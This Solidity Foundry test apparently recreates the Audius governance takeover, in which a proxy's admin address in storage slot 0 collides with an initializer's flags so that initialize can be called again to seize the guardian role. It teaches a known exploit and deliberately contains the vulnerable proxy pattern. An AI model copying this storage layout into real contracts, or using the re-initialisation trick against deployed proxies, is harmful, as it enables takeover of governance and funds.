// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

// We take Audius as an example. For more details, you can refer to Audius Governance Takeover Post-Mortem 7/23/22 and Remediation.
// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22

interface ILogic {
    function getguardianAddress() external returns (address);

    function getproxyAdmin() external returns (address);

    function initialize(address) external;

    function getinitializing() external returns (bool);

    function getinitialized() external returns (bool);

    function isConstructor() external view returns (bool);
}

contract ContractTest is Test {
    Logic LogicContract;
    TestProxy ProxyContract;

    function testStorageCollision() public {
        LogicContract = new Logic();
        ProxyContract = new TestProxy(
            address(LogicContract),
            address(msg.sender),
            address(this)
        );

        console.log(
            "Current guardianAddress:",
            ILogic(address(ProxyContract)).getguardianAddress()
        );
        console.log(
            "Current initializing boolean:",
            ILogic(address(ProxyContract)).getinitializing()
        );
        console.log(
            "Current initialized boolean:",
            ILogic(address(ProxyContract)).getinitialized()
        );
        console.log("Try to call initialize to change guardianAddress");
        ILogic(address(ProxyContract)).initialize(address(msg.sender));

        console.log(
            "After initializing, changed guardianAddress to attacker:",
            ILogic(address(ProxyContract)).getguardianAddress()
        );
        console.log(
            "After initializing,  initializing boolean is still true:",
            ILogic(address(ProxyContract)).getinitializing()
        );
        console.log(
            "After initializing,  initialized boolean:",
            ILogic(address(ProxyContract)).getinitialized()
        );

        /*
In this case because the last byte of the proxyAdmin address is `0x72`, initialized was interpreted as a truthy value. 
Similarly, because the second byte of the proxyAdmin address is `0xea`, 
initializing was also interpreted as a truthy value. This caused the initializer() modifier to always succeed:
*/

        console.log("Exploit completed");
    }

    receive() external payable {}
}

contract TestProxy is TransparentUpgradeableProxy {
    address private proxyAdmin; // slot 0 - storage collision here

    constructor(
        address _logic,
        address _admin,
        address guardianAddress
    )
        TransparentUpgradeableProxy(
            _logic,
            _admin,
            abi.encodeWithSelector(
                bytes4(0xc4d66de8), // bytes4(keccak256("initialize(address)"))
                guardianAddress
            )
        )
    {
        proxyAdmin = _admin;
    }
}

contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private initializing;

    /**
     * @dev Modifier to use in the initializer function of a contract.
     */
    modifier initializer() {
        require(
            initializing || isConstructor() || !initialized,
            "Contract instance has already been initialized"
        );

        bool isTopLevelCall = !initializing;
        if (isTopLevelCall) {
            initializing = true;
            initialized = true;
        }

        _;

        if (isTopLevelCall) {
            initializing = false;
        }
    }

    /// @dev Returns true if and only if the function is running in the constructor
    function isConstructor() private view returns (bool) {
        // extcodesize checks the size of the code stored in an address, and
        // address returns the current address. Since the code is still not
        // deployed when running a constructor, any checks on its code size will
        // yield zero, making it an effective way to detect if a contract is
        // under construction or not.
        address self = address(this);
        uint256 cs;
        assembly {
            cs := extcodesize(self)
        }
        return cs == 0;
    }

    // Reserved storage space to allow for layout changes in the future.
    uint256[50] private ______gap;

    function getinitializing() public view returns (bool) {
        return initializing;
    }

    function getinitialized() public view returns (bool) {
        return initialized;
    }
}

contract Logic is Initializable {
    address private guardianAddress;

    function initialize(address _guardianAddress) public initializer {
        guardianAddress = _guardianAddress; //Guardian address becomes the only party
    }

    function getguardianAddress() public view returns (address) {
        return guardianAddress;
    }
}
